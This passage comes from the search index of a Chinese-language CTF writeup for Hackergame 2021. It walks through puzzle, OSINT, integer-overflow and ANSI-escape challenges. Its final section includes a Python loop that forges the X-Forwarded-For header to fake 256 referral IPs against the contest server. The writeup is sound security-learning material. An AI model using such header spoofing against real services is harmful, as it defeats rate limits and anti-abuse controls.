2021"},{"location":"writeups/hackergame2021/#hackergame-2021-writeup","text":"Abstract \u53c2\u52a0\u7684\u7b2c\u4e00\u4e2a\u53ef\u4ee5\u7b97\u662f CTF \u7684\u6bd4\u8d5b\u3002\u8fd9\u91cc\u662f\u6211\u505a\u51fa\u7684\u9898\u7684 writeup\uff0c\u535a\u5ba2\u7248\u5728\uff1a https://blog.tonycrane.cc/p/c05d7b7c.html \u5b98\u65b9 writeup","title":"Hackergame 2021 Writeup"},{"location":"writeups/hackergame2021/#_1","text":"\u4e3a\u4e86\u80fd\u8ba9\u5927\u5bb6\u987a\u5229\u7b7e\u5230\uff0c\u547d\u9898\u7ec4\u628a\u6bcf\u4e00\u79d2\u7684 flag \u90fd\u8bb0\u5f55\u4e0b\u6765\u5236\u6210\u4e86\u65e5\u8bb0\u672c\u7684\u4e00\u9875\u3002\u4f60\u53ea\u9700\u8981\u6253\u5f00\u65e5\u8bb0\uff0c\u7ffb\u5230 Hackergame 2021 \u6bd4\u8d5b\u8fdb\u884c\u671f\u95f4\u7684\u4efb\u4f55\u4e00\u9875\u5c31\u80fd\u5f97\u5230 flag\uff01 \u5f88\u660e\u786e\uff0c\u8fdb\u5165\u7f51\u5740\u540e\u4e00\u76f4\u70b9 Next \u7ffb\u5230\u6bd4\u8d5b\u65f6\u95f4\u5c31\u597d\u4e86\uff08\u8bef \u770b\u5230\u4e86 URI \u91cc\u6709 ?page=... \uff0c\u6240\u4ee5\u4e5f\u61d2\u5f97\u8ba1\u7b97\u4e86\uff0c\u624b\u52a8\u4e8c\u5206\uff0c\u5927\u6982 ?page=1635000000 \u5de6\u53f3\u5c31\u53ef\u4ee5\u770b\u5230 flag \u4e86 \u8d5b\u540e\u624d\u53cd\u5e94\u8fc7\u6765\u539f\u6765\u662f UNIX \u65f6\u95f4\u6233","title":"\u7b7e\u5230"},{"location":"writeups/hackergame2021/#_2","text":"\u4e5f\u5f88\u660e\u786e\uff0c\u76f4\u63a5\u628a\u53f3\u4fa7\u6321\u4f4f\u7684 flag \u90e8\u5206\u5bf9\u5e94\u5de6\u8fb9\u7684\u5341\u516d\u8fdb\u5236\u6570\u6362\u7b97\u6210\u5341\u8fdb\u5236\uff0c\u7136\u540e\u6839\u636e ASCII \u7801\u8f6c\u6210\u5b57\u7b26\u3002\u6216\u8005\u76f4\u63a5\u628a\u5de6\u4fa7\u6284\u8fdb Hex Friend \u4e5f\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230\u53f3\u4fa7\u7684flag\u3002 \uff08**\u5f53\u65f6\u8fd9\u9898\u6284\u4e32\u884c\u4e86\u4e24\u4e09\u6b21\u2026\u2026\uff09","title":"\u8fdb\u5236\u5341\u516d\u2014\u2014\u53c2\u4e0a"},{"location":"writeups/hackergame2021/#_3","text":"\u5f53\u7136\uff0c\u5982\u679c\u53ea\u662f\u8fd9\u6837\u8fd8\u8fdc\u8fdc\u4e0d\u591f\u3002\u9075\u4f9d\u53f2\u79f0\u201c\u8001\u7239\u201d\u7684\u4e0a\u53e4\u5148\u8d24\u7684\u81f3\u7406\u540d\u8a00\uff0c\u5fc5\u987b\u8981\u201c\u7528\u9b54\u6cd5\u6253\u8d25\u9b54\u6cd5\u201d\u3002X \u540c\u5b66\u5411\u4e0a\u7ea7\u7533\u8bf7\u5230\u4e86\u79d1\u5927\u897f\u533a\u540c\u6b65\u8f90\u5c04\u5b9e\u9a8c\u5ba4\u8bbe\u5907\u7684\u4f7f\u7528\u6743\u9650\uff0c\u4ee5\u6b64\u6253\u901a\u6b21\u5143\u7a7a\u95f4\uff0c\u501f\u52a9\u5230\u53e6\u4e00\u4e2a\u5e73\u884c\u5b87\u5b99\u4e2d Z \u540c\u5b66\u7684\u6cd5\u529b\u8fdb\u884c\u6570\u636e\u5bf9\u51b2\uff0c\u65b9\u624d\u4e8e\u4e71\u4e2d\u640f\u5f97\u4e00\u4e1d\u673a\u4f1a\uff0c\u5c06 flag \u7528\u65e0\u7ebf\u7535\u7684\u5f62\u5f0f\u53d1\u5c04\u4e86\u51fa\u53bb\u3002 \u8003\u8651\u5230\u4fe1\u606f\u7684\u9c81\u68d2\u6027\uff0cX \u540c\u5b66\u4f7f\u7528\u4e86\u65e0\u7ebf\u7535\u4e2d\u60ef\u7528\u7684\u65b9\u6cd5\u6765\u533a\u5206\u5b57\u7b26\u4e32\u4e2d\u8bfb\u97f3\u76f8\u8fd1\u7684\u5b57\u6bcd\u3002\u5373\u4f7f\u5982\u6b64\uff0c\u6253\u7834\u6b21\u5143\u7684\u5f3a\u5927\u80fd\u91cf\u626d\u66f2\u4e86\u65f6\u7a7a\uff0c\u4f7f\u5f97\u6700\u7ec8\u63a5\u53d7\u5230\u7684\u5f55\u97f3\u7684\u901f\u5ea6\u6709\u6240\u6539\u53d8\u3002 \uff08\u8fd9\u9898\u5728\u7fa4\u91cc\u770b\u8d77\u6765\u597d\u50cf\u5361\u4e86\u5f88\u591a\u4eba\uff0c\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\uff09 \u9898\u76ee\u4e0b\u8f7d\u4e0b\u6765\u662f\u4e00\u4e2a\u542c\u8d77\u6765\u6742\u4e71\u7684\u97f3\u9891 \u9898\u91cc\u6700\u540e\u8bf4\u4e86 \u201c\u6700\u7ec8\u63a5\u53d7\u5230\u7684\u5f55\u97f3\u7684 \u901f\u5ea6 \u6709\u6240\u6539\u53d8\u201d\uff0c\u6240\u4ee5\u8003\u8651\u5c06\u97f3\u9891\u65f6\u95f4\u62c9\u957f\u3002 \u6700\u5f00\u59cb\u4f7f\u7528\u4e86 Adobe Audition\uff0c\u4f46\u662f\u6548\u679c\u4e0d\u662f\u5f88\u7406\u60f3\uff0c\u5927\u6982\u662f\u91cd\u65b0\u91c7\u6837\u7b49\u4e00\u7cfb\u5217\u7b97\u6cd5\u5bfc\u81f4\u7684 \u6240\u4ee5\u6362\u4e86 Adobe Premier Pro \u76f4\u63a5\u7528\u6bd4\u7387\u62c9\u4f38\u5de5\u5177\u62c9\u957f\u97f3\u9891\uff0c\u8fd8\u662f\u53ef\u4ee5\u542c\u6e05\u7684 \u4e0d\u65ad\u5c1d\u8bd5\u4e4b\u540e\uff0c\u5927\u6982\u653e\u6162\u4e09\u500d\u5de6\u53f3\u5c31\u53ef\u4ee5\u542c\u51fa\u8bfb\u7684\u662f\u82f1\u8bed\u5355\u8bcd\u4e86 \u9898\u91cc\u8bf4\u5230\u4e86 \u201c\u8003\u8651\u5230\u4fe1\u606f\u7684\u9c81\u68d2\u6027\uff0cX \u540c\u5b66\u4f7f\u7528\u4e86 \u65e0\u7ebf\u7535\u4e2d\u60ef\u7528\u7684\u65b9\u6cd5 \u6765\u533a\u5206\u5b57\u7b26\u4e32\u4e2d\u8bfb\u97f3\u76f8\u8fd1\u7684\u5b57\u6bcd\u201d\uff0c\u6240\u4ee5\u5c31\u67e5\u5230\u4e86 \u56fd\u9645\u822a\u7a7a\u65e0\u7ebf\u7535\u901a\u8baf26\u4e2a\u82f1\u6587\u5b57\u6bcd\u8bfb\u6cd5 \u7136\u540e\u4ed4\u7ec6\u542c\uff0c\u8fa8\u522b\u6bcf\u4e2a\u5355\u8bcd\u7684\u7b2c\u4e00\u4e2a\u97f3\u5c31\u53ef\u4ee5\u5f97\u5230 flag \u4e86","title":"\u53bb\u5427\uff01\u8ffd\u5bfb\u81ea\u7531\u7684\u7535\u6ce2"},{"location":"writeups/hackergame2021/#pro-max","text":"\u4e94\u9053\u5201\u94bb\u7684\u9898\u76ee\uff0c\u4f46\u662f\u8fd8\u662f\u597d\u67e5\u5230\u7684\uff0c\u9898\u76ee\u91cc\u4e5f\u8bf4\u4e86\u201c\u89e3\u51fa\u8c1c\u9898\u4e0d\u9700\u8981\u662f\u79d1\u5927\u5728\u6821\u5b66\u751f\u201d 2017 \u5e74\uff0c\u4e2d\u79d1\u5927\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\uff08SEC@USTC\uff09\u5e76\u5165\u4e2d\u79d1\u5927 Linux \u7528\u6237\u534f\u4f1a\uff08USTCLUG\uff09\u3002\u76ee\u524d\uff0c\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\u7684\u57df\u540d\uff08sec.ustc.edu.cn\uff09\u5df2\u7ecf\u65e0\u6cd5\u8bbf\u95ee\uff0c\u4f46\u4f60\u80fd\u627e\u5230\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\u7684\u793e\u56e2\u7ae0\u7a0b\u5728\u54ea\u4e00\u5929\u7684\u4f1a\u5458\u4ee3\u8868\u5927\u4f1a\u4e0a\u901a\u8fc7\u7684\u5417\uff1f \u770b\u5230\u4e86 \u201c\u76ee\u524d\uff0c\u5df2\u7ecf\u65e0\u6cd5\u8bbf\u95ee\u201d \u8bf4\u660e\u8fd9\u4e2a\u57df\u540d\u66fe\u7ecf\u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\uff0c\u76f4\u63a5\u901a\u8fc7 \u4e92\u8054\u7f51\u7684\u8bb0\u5fc6 archive.org\uff0c\u67e5\u5230\u8fd9\u4e2a\u57df\u540d\u7684\u5386\u53f2\u5b58\u6863\uff0c\u968f\u4fbf\u627e\u4e00\u5929\u5c31\u53ef\u4ee5\u770b\u5230\u4ed6\u4eec\u5b98\u7f51\u4e2d\u7684 \u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\u793e\u56e2\u7ae0\u7a0b \u3002 \u5176\u4e2d\u7b2c\u4e00\u884c\u5c31\u5199\u4e86 \u201c\u672c\u7ae0\u7a0b\u5728 2015 \u5e74 5 \u6708 4 \u65e5 \uff0c\u7ecf\u4f1a\u5458\u4ee3\u8868\u5927\u4f1a\u5ba1\u8bae\u901a\u8fc7\u3002\u201d \u6240\u4ee5\u7b54\u6848\u5c31\u662f 20150504 \u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66 Linux \u7528\u6237\u534f\u4f1a\u5728\u8fd1\u4e94\u5e74\u591a\u5c11\u6b21\u88ab\u8bc4\u4e3a\u6821\u4e94\u661f\u7ea7\u793e\u56e2\uff1f \u76f4\u63a5\u53bb\u79d1\u5927 LUG \u5b98\u7f51\u7684 Intro \u9875\u9762 \uff0c\u5c31\u53ef\u4ee5\u770b\u5230 \u201c\u4e8e 2015 \u5e74 5 \u6708\u30012017 \u5e74 7 \u6708\u30012018 \u5e74 9 \u6708\u30012019 \u5e74 8 \u6708\u53ca 2020 \u5e74 9 \u6708\u88ab\u8bc4\u4e3a\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u4e94\u661f\u7ea7\u5b66\u751f\u793e\u56e2\u3002\u201d \u6240\u4ee5\u662f4\u6b21\uff08x \u4f46\u662f\u6000\u7591\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u6ca1\u67092021\u5e74\uff0c\u56e0\u4e3a\u90fd\u662f\u57289\u6708\u4efd\u5de6\u53f3\uff0c\u6240\u4ee5\u53ef\u80fd\u662f\u6570\u636e\u6ca1\u66f4\u65b0\uff0c\u8fd9\u98984\u548c5\u90fd\u6709\u53ef\u80fd \u5c1d\u8bd5\u540e\u5f97\u5230\u7b54\u6848\u662f 5 \u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66 Linux \u7528\u6237\u534f\u4f1a\u4f4d\u4e8e\u897f\u533a\u56fe\u4e66\u9986\u7684\u6d3b\u52a8\u5ba4\u95e8\u53e3\u7684\u724c\u5b50\u4e0a\u201cLUG @ USTC\u201d\u4e0b\u65b9\u7684\u5c0f\u5b57\u662f\uff1f \u8fd9\u9898\u4e5f\u7b80\u5355\uff0c\u76f4\u63a5\u95ee\u79d1\u5927\u540c\u5b66\u5c31\u597d\u4e86\uff08x \u7ffb\u4e86 LUG \u7684\u5fae\u4fe1\u516c\u4f17\u53f7\u548c QQ \u5b98\u65b9\u53f7\uff0c\u90fd\u6ca1\u5565\u6536\u83b7\uff0c\u6700\u540e\u53d1\u73b0\u5b98\u7f51\u4e0a\u6709 News \u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5982\u679c\u65b0\u542f\u7528\u6d3b\u52a8\u5ba4\u7684\u8bdd\uff0c\u4e00\u5b9a\u4f1a\u6709\u4e00\u7bc7\u65b0\u95fb\u7a3f\uff0c\u641c\u7d22\u201c\u56fe\u4e66\u9986\u201d\u5f97\u5230\u4e86 \u300c\u897f\u533a\u56fe\u4e66\u9986\u65b0\u6d3b\u52a8\u5ba4\u542f\u7528\u300d \u8fd9\u7bc7\u6587\u7ae0\uff0c\u5f00\u7bc7\u7b2c\u4e00\u5f20\u5927\u56fe\u5c31\u662f\u95e8\u53e3\u724c\u5b50\u7684\u7167\u7247 \u6240\u4ee5\u7b54\u6848\u662f Development Team of Library \uff08\u6ce8\u610f\u5927\u5c0f\u5199\uff09 \u5728 SIGBOVIK 2021 \u7684\u4e00\u7bc7\u5173\u4e8e\u4e8c\u8fdb\u5236 Newcomb-Benford \u5b9a\u5f8b\u7684\u8bba\u6587\u4e2d\uff0c\u4f5c\u8005\u4e00\u5171\u5c55\u793a\u4e86\u591a\u5c11\u4e2a\u6570\u636e\u96c6\u5bf9\u5176\u7406\u8bba\u7ed3\u679c\u8fdb\u884c\u9a8c\u8bc1\uff1f \u5e94\u8be5\u6ca1\u5fc5\u8981\u641c\u8c37\u6b4c\u5b66\u672f\u4e4b\u7c7b\u7684\uff0c\u76f4\u63a5\u5fc5\u5e94\u67e5 \u201cSIGBOVIK Newcomb-Benford\u201d \u5c31\u53ef\u4ee5\u627e\u5230 SIGBOVIK \u7684 \u8fd9\u4e00\u7bc7\u5927\u6587\u7ae0\u5408\u96c6 \uff0c\u518d\u641c\u7d22 Newcomb \u5c31\u53ef\u4ee5\u770b\u5230\u9898\u76ee\u91cc\u8bf4\u7684\u8bba\u6587\u4e86\u3002 \u5168\u6587\u4e5f\u4e0d\u957f\uff0c\u53ea\u6709\u56db\u9875\uff0c\u540e\u4e24\u9875\u5168\u662f\u6570\u636e\u7684\u56fe\uff0c\u6570\u4e00\u4e0b\uff0c\u4e00\u5171\u670913\u5e45 \u6240\u4ee5\u7b54\u6848\u662f 13 \u4e0d\u4e25\u683c\u9075\u5faa\u534f\u8bae\u89c4\u8303\u7684\u64cd\u4f5c\u7740\u5b9e\u4ee4\u4eba\u751f\u538c\uff0c\u597d\u5728 IETF \u4e8e 2021 \u5e74\u6210\u7acb\u4e86 Protocol Police \u4ee5\u76d1\u7763\u5e76\u60e9\u6212\u6240\u6709\u8fdd\u80cc RFC \u6587\u6863\u7684\u884c\u4e3a\u4e2a\u4f53\u3002\u5047\u5982\u4f60\u53d1\u73b0\u4e86\u67d0\u4f4d\u540c\u5b66\u53ef\u80fd\u8fdd\u53cd\u4e86\u534f\u8bae\u89c4\u8303\uff0c\u6839\u636e Protocol Police \u76f8\u5173\u6587\u6863\u4e2d\u89c4\u5b9a\u7684\u4e3e\u62a5\u65b9\u6cd5\uff0c\u4f60\u5e94\u8be5\u5c06\u4f60\u7684\u4e3e\u62a5\u4fe1\u53d1\u5f80\u4f55\u5904\uff1f \u6ca1\u5565\u597d\u8bf4\u7684\uff0c\u76f4\u63a5\u67e5\uff0c\u7b54\u6848 /dev/null \u7136\u540e\u63d0\u4ea4\u5c31\u53ef\u4ee5\u5f97\u5230 flag","title":"\u732b\u54aa\u95ee\u7b54 Pro Max"},{"location":"writeups/hackergame2021/#_4","text":"\u9898\u76ee\u91cc\u6bd4\u8f83\u91cd\u8981\u7684\u8bdd\u5c31\u662f\uff1a \u8865\u5145\u8bf4\u660e\uff1a\u5f53\u79f0\u7684\u6570\u5b57\u53d8\u4e3a\u6d6e\u70b9\u6570\u800c\u4e0d\u662f\u6574\u6570\u65f6\uff0cHQ \u4e0d\u4f1a\u8ba4\u53ef\u6700\u7ec8\u7684\u79f0\u91cd\u7ed3\u679c\u3002 \u9898\u76ee\u7684\u76ee\u7684\u4e5f\u5f88\u660e\u786e\uff0c\u7528\u4e00\u58069\u548c\u4e00\u58066\u52a0\u8d77\u6765\u5f97\u523020\u3002\u80af\u5b9a\u4e0d\u80fd \u50cf\u534e\u5f3a\u4e00\u6837 \u5288\u74dc\uff0c\u6240\u4ee5\u8f93\u5165\u4e00\u5b9a\u662f\u6574\u6570 \u90a3\u5c31\u53ef\u4ee5\u8003\u8651\u6ea2\u51fa \u4f46\u662f\u7ecf\u8fc7\u5c1d\u8bd5\uff0c\u7ed9\u7684\u6570\u5b57\u592a\u5927\uff0c\u5c31\u4f1a\u4f7f\u7ed3\u679c\u6ea2\u51fa\u5230\u6d6e\u70b9\u6570\uff0c\u8fd9\u4e0d\u662f\u60f3\u8981\u7684\uff08\u56e0\u4e3a\u5373\u4f7f\u51d1\u5230\u4e8620.0\u4e5f\u4e0d\u6b63\u786e\uff09 \u90a3\u5982\u679c\u6570\u5b57\u518d\u5927\u5462\uff0c\u6bd4\u5982 2000000000000000000\uff0818\u4e2a0\uff09\u4e2a9\u65a4\u7684\u74dc\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u8fd9\u65f6\u76f4\u63a5\u6ea2\u51fa\u5230\u4e86\u8d1f\u6574\u578b -446744073709551616 \u518d\u8865\u4e0a 49638230412172000 \u4e2a9\u65a4\u7684\u74dc\u5c31\u53ef\u4ee5\u5f97\u5230 -3616\uff0c\u52a0\u4e0a20\u53ef\u4ee5\u88ab6\u6574\u9664\uff0c\u6240\u4ee5\u518d\u52a0\u4e0a606\u4e2a6\u65a4\u7684\u74dc\u5c31\u53ef\u4ee5\u5f97\u5230 20 \u606d\u559c\u4f60\u9003\u8fc7\u4e00\u52ab\uff01\u534e\u5f3a\uff5e\u534e\u5f3a\uff01","title":"\u5356\u74dc"},{"location":"writeups/hackergame2021/#_5","text":"\u4e00\u4e2a\u900f\u660e\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u5728\u7ec8\u7aef\u4e2d\u5c55\u793a\u4e00\u4e2a\u4e94\u989c\u516d\u8272\u7684 flag\u3002 \u53ef\u80fd\u662f\u5728 cmd.exe \u7b49\u52a3\u8d28\u7ec8\u7aef\u4e2d\u88ab\u957f\u671f\u4f7f\u7528\u7684\u539f\u56e0\uff0c\u8fd9\u4e2a\u6587\u4ef6\u5931\u53bb\u4e86\u4e00\u4e9b\u91cd\u8981\u6210\u5206\uff0c\u53d8\u6210\u4e86\u4e00\u5806\u4e71\u7801\uff0c\u4e5f\u4e0d\u4f1a\u518d\u663e\u793a\u51fa flag \u4e86\u3002 \u6ce8\u610f\uff1aflag \u5185\u90e8\u7684\u5b57\u7b26\u5168\u90e8\u4e3a\u5c0f\u5199\u5b57\u6bcd\u3002 \u62ff\u5230\u6587\u4ef6\uff0c\u770b\u5230\u91cc\u9762\u597d\u591a [ ; m \u4e4b\u7c7b\u7684\uff0c\u518d\u7ed3\u5408\u7ec8\u7aef\u4e2d\u8f93\u51fa\u5e26\u989c\u8272\u6587\u5b57\u7684 \\033[...m; \u4e4b\u7c7b\u7684\u65b9\u6cd5\uff0c\u4ee5\u53ca\u9898\u76ee\u4e2d\u7684 \u201c\u5931\u53bb\u4e86\u4e00\u4e9b \u91cd\u8981\u6210\u5206 \u201d \u6240\u4ee5\u76f4\u63a5\u5c1d\u8bd5\u628a [ \u5168\u5c40\u66ff\u6362\u4e3a \\033[ \uff0c\u7136\u540e\u590d\u5236\u5230 python \u4e2d print\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u795e\u5947\u7684\u4e00\u5e55\u4e86\uff08\u5176\u5b9e\u5e76\u6ca1\u5b8c\u5168\u505a\u5b8c\uff0c\u4f46\u662f\u53ef\u4ee5\u5df2\u7ecf\u770b\u4e86\uff09 \u7136\u540e\u8bfb\u51fa flag \u5373\u53ef\uff08\u5168\u662f\u5c0f\u5199\u5b57\u6bcd\uff09","title":"\u900f\u660e\u7684\u6587\u4ef6"},{"location":"writeups/hackergame2021/#_6","text":"\u4f60\u7684\u5b66\u957f\u51b3\u5b9a\u6765\u4e00\u573a\u8bf4\u8d70\u5c31\u8d70\u7684\u65c5\u884c\u3002\u901a\u8fc7\u4ed6\u53d1\u7ed9\u4f60\u7684\u7167\u7247\u6765\u770b\uff0c\u4ed6\u5e94\u8be5\u662f\u5728\u9152\u5e97\u4f4f\u4e0b\u4e86\u3002 \u4ece\u7167\u7247\u6765\u770b\uff0c\u9152\u5e97\u4f3c\u4e4e\u5728\u5c0f\u533a\u7684\u4e00\u680b\u9ad8\u697c\u91cc\uff0c\u9644\u8fd1\u8fd8\u6709\u4e00\u5bb6 KFC \u5206\u5e97\u3002\u7a81\u7136\uff0c\u4f60\u610f\u8bc6\u5230\u7167\u7247\u91cc\u900f\u9732\u51fa\u6765\u7684\u4fe1\u606f\u6bd4\u8868\u9762\u4e0a\u770b\u8d77\u6765\u7684\u8981\u591a\u3002 \u8bf7\u89c2\u5bdf\u7167\u7247\u5e76\u7b54\u5bf9\u5168\u90e8 5 \u9053\u9898\u4ee5\u83b7\u53d6 flag\u3002\u6ce8\u610f\uff1a\u56fe\u7247\u672a\u5728\u5176\u4ed6\u5730\u65b9\u516c\u5f00\u53d1\u5e03\u8fc7\uff0c\u4e5f\u672a\u91c7\u53d6\u4efb\u4f55\u9690\u5199\u63aa\u65bd\uff08\u901a\u8fc7\u624b\u673a\u62cd\u6444\u5c4f\u5e55\u4ea6\u53ef\u7b54\u9898\uff09\u3002 \u201c\u624b\u673a\u62cd\u6444\u5c4f\u5e55\u4ea6\u53ef\u7b54\u9898\u201d\uff0c\u6240\u4ee5\u7167\u7247\u4e2d\u6ca1\u6709\u4efb\u4f55\u5730\u5740\u7684\u5143\u4fe1\u606f\uff0c\u53ea\u80fd\u9760\u770b\u56fe \u7ebf\u7d22 \uff1a\u6d77\u8fb9\u3001KFC\u3001\u9ad8\u697c\u3001\u5927\u77f3\u5934\u3001\u505c\u8f66\u4f4d \u5148\u770b\u90a3\u4e2aKFC\uff0c\u5927\u6982\u662f\u4e2a\u7f51\u7ea2\u5e97\uff0c\u6240\u4ee5\u641c\u7d22 \u201c\u7f51\u7ea2 \u6d77\u8fb9 KFC\u201d\uff0c\u67e5\u5230\u4e86\u79e6\u7687\u5c9b\uff0c\u800c\u4e14\u4e5f\u662f\u6d77\u8fb9 \u518d\u8fdb\u4e00\u6b65\u770b\u5730\u56fe\u548c\u8857\u666f\u5730\u56fe\u5c31\u53ef\u4ee5\u786e\u5b9a\u5730\u70b9\u5728 \u79e6\u7687\u5c9b\u65b0\u6fb3\u6d77\u5e95\u4e16\u754c \u7136\u540e\u662f5\u4e2a\u95ee\u9898 \u8be5\u7167\u7247\u62cd\u6444\u8005\u7684\u9762\u671d\u65b9\u5411\u4e3a\uff1a \u6839\u636e\u5730\u56fe\uff0c\u5bf9\u6bd4\u4e00\u4e0b\u5c31\u53ef\u4ee5\u5f97\u5230\uff0c\u9762\u671d\u65b9\u5411\u662f \u4e1c\u5357 \u8be5\u7167\u7247\u7684\u62cd\u6444\u65f6\u95f4\u5927\u81f4\u4e3a\uff1a \u6839\u636e\u9009\u9879\u91cc\u7684\u65f6\u95f4\uff0c\u4e0b\u5348\u662f\u4e24\u70b9\u534a\u5de6\u53f3\uff0c\u800c\u5728\u4e1c\u5317\u7684\u4e24\u70b9\u534a\u5de6\u53f3\u5176\u5b9e\u548c\u4e2d\u5348\u5dee\u4e0d\u591a\uff0c\u5f71\u5b50\u548c\u5149\u6e29\u4e5f\u4e0d\u592a\u50cf\u8fd9\u4e2a\u6837\u5b50\uff0c\u6240\u4ee5\u53ef\u4ee5\u786e\u5b9a\u65f6\u95f4\u5927\u81f4\u662f \u508d\u665a \u8be5\u7167\u7247\u7684\u62cd\u6444\u8005\u6240\u5728\u697c\u5c42\u4e3a\uff1a \u4e0d\u597d\u786e\u5b9a\uff0c\u4f46\u662f\u7b54\u6848\u53ef\u4ee5\u4ea4\u5f88\u591a\u6b21\uff0c\u6240\u4ee5\u4ece9\u5c42\u5de6\u53f3\u4f9d\u6b21\u8bd5\u5c31\u53ef\u4ee5\u4e86\uff0c\u6700\u540e\u5f97\u5230\u697c\u5c42\u662f 14 \u8be5\u7167\u7247\u5de6\u4e0a\u89d2 KFC \u5206\u5e97\u7684\u7535\u8bdd\u53f7\u7801\u662f\uff1a \u76f4\u63a5\u7528\u5730\u56fe\u8f6f\u4ef6\u641c \u201c\u79e6\u7687\u5c9b\u65b0\u6fb3 KFC\u201d \u5c31\u53ef\u4ee5\u67e5\u5230\u90a3\u5bb6\u5e97\u94fa\uff0c\u4e5f\u7ed9\u4e86\u7535\u8bdd\uff0c\u6216\u8005\u641c\u7d22 \u201d\u7f51\u7ea2 \u6d77\u8fb9 KFC\u201c \u4e5f\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230\u7535\u8bdd\uff1a 0335-7168800 \u8be5\u7167\u7247\u5de6\u4e0a\u89d2 KFC \u5206\u5e97\u5de6\u4fa7\u5efa\u7b51\u6709\u4e09\u4e2a\u6c34\u5e73\u6392\u5217\u7684\u6c49\u5b57\uff0c\u5b83\u4eec\u662f\uff1a \u901a\u8fc7\u8857\u666f\u5730\u56fe\u5c31\u53ef\u4ee5\u770b\u5230 KFC \u5de6\u8fb9\u7684\u5efa\u7b51\u4e0a\u5199\u4e86 \u6d77\u8c5a\u9986","title":"\u65c5\u884c\u7167\u7247"},{"location":"writeups/hackergame2021/#flag","text":"\u53c2\u4e0e\u6d3b\u52a8\uff0c\u52a9\u529b\u62bd\u5956\uff01\u96c6\u6ee1 1 \u4e2a flag\uff0c\u5373\u53ef\u63d0\u53d6 1 \u4e2a flag\u3002 \u606d\u559c\u4f60\u79ef\u6512\u5230 0.5\u2026\u2026 \u4e2a flag\uff0c \u5269\u4f59\u65f6\u95f4\uff1a10\u520600\u79d2 \u5df2\u6709 0 \u4f4d\u597d\u53cb\u4e3a\u60a8\u52a9\u529b\u3002 \u5c06\u5982\u4e0b\u94fe\u63a5\u5206\u4eab\u7ed9\u597d\u53cb\uff0c\u53ef\u4ee5\u83b7\u5f97\u597d\u53cb\u52a9\u529b\uff0c\u83b7\u5f97\u66f4\u591a flag\uff1a\u2026\u2026 \u8001\u5e76\u5915\u5915\u4e86 \uff0c\u7ecf\u8fc7\u4e00\u4e9b\u6d4b\u8bd5\u548c\u770b\u89c4\u5219\u53ef\u4ee5\u77e5\u9053\uff0cip \u5728\u540c\u4e00 /8 \u7f51\u6bb5\u7684\u7528\u6237\u88ab\u89c6\u4e3a\u540c\u4e00\u7528\u6237\uff0c\u5373 ip \u5730\u5740\u7684\u7b2c\u4e00\u4e2a\u70b9\u524d\u9762\u7684\u6570\u5b57\u4e0d\u4e00\u6837\u624d\u662f\u4e0d\u540c\u7528\u6237 \u518d\u7528\u865a\u62df\u673a\u548c\u624b\u673a\u8bd5\u4e00\u4e0b\uff0c\u53d1\u73b0\u6bcf\u4e2a\u7528\u6237\u589e\u52a0\u7684 flag \u6570\u91cf\u5f88\u5c0f \u6240\u4ee5\u63a8\u6d4b\u9700\u8981200+\u4e2a ip \u5730\u5740\uff0c\u80af\u5b9a\u4e0d\u4f1a\u8981\u771f\u7684\u8f6c\u53d1\uff0c\u800c\u4e14\u4e5f\u5f88\u96be\u51d1\u51fa\u5f88\u591a\u4e0d\u5728\u540c\u4e00 /8 \u7f51\u6bb5\u7684 ip \u4e8e\u662f\u5728 BurpSuite \u91cc\u9762\u6293\u5305\u53ef\u4ee5\u770b\u5230\uff0c\u6bcf\u6b21\u70b9\u51fb\u201c\u52a9\u529b\u201d\u90fd\u4f1a\u53d1\u9001\u4e00\u4e2a\u5230\u52a9\u529b\u94fe\u63a5\u7684 POST\uff0c\u5185\u5bb9\u4e3a ip \u5730\u5740 \u7136\u540e\u5c06\u5176\u53d1\u9001\u5230 Repeater \u4e2d\uff0c\u5c1d\u8bd5\u66f4\u6539 ip \u5730\u5740\uff0c\u5f97\u5230\u7684 Response \u4e2d\u8bf4 \u201c\u5931\u8d25\uff01\u68c0\u6d4b\u5230\u524d\u540e\u7aef\u68c0\u6d4b IPv4 \u5730\u5740\u4e0d\u5339\u914d\u201d \u6240\u4ee5\u4ec5\u4ec5\u66f4\u6539 POST \u5185\u5bb9\u7684 ip \u662f\u4e0d\u591f\u7684\uff0c\u800c\u63d0\u4f9b\u7ed9\u68c0\u6d4b\u7684\u5185\u5bb9\u4e5f\u4ec5\u4ec5\u662f\u4e00\u4e2a POST\uff0c\u6240\u4ee5\u53ef\u4ee5\u66f4\u6539 POST \u5934\uff0c\u6dfb\u52a0 X-Forwarded-For \u7136\u540e\u4f7f\u7528 python \u5c31\u53ef\u4ee5\u5faa\u73af\u53d1\u9001 POST \u5e76\u4f2a\u9020 ip \u5730\u5740\u5f97\u5230256\u4e2a\u52a9\u529b\u4e86\uff0c\u521a\u597d\u8fbe\u52301\u4e2aflag\uff1a \uff08\u8981\u6ce8\u610f sleep \u4e00\u6bb5\u65f6\u95f4\uff0c\u4e0d\u7136\u4f1a\u51fa\u73b0\u64cd\u4f5c\u8fc7\u5feb\u62d2\u7edd\u7684\u60c5\u51b5\uff1b\u4e5f\u4e0d\u8981 sleep \u8fc7\u957f\uff0c\u5426\u5219\u8d85\u8fc710\u5206\u949f flag \u5c31\u65e0\u6548\u4e86\uff09 import requests import time from tqdm import tqdm url = \"http://202.38.93.111:10888/invite/...\" with tqdm ( total = 256 ) as pbar : for i in range ( 256 ): res = requests . post ( url , data = { \"ip\" : f \" { i } .0.0.0\" }, headers = { \"X-Forwarded-For\" : f \" { i } .0.0.0\" }) if \"\u6210\u529f\" not in res . text : print ( \"[x] \u5931\u8d25\" ) print ( res . text ) time . sleep ( 1.5 ) pbar . update ( 1 )","title":"FLAG 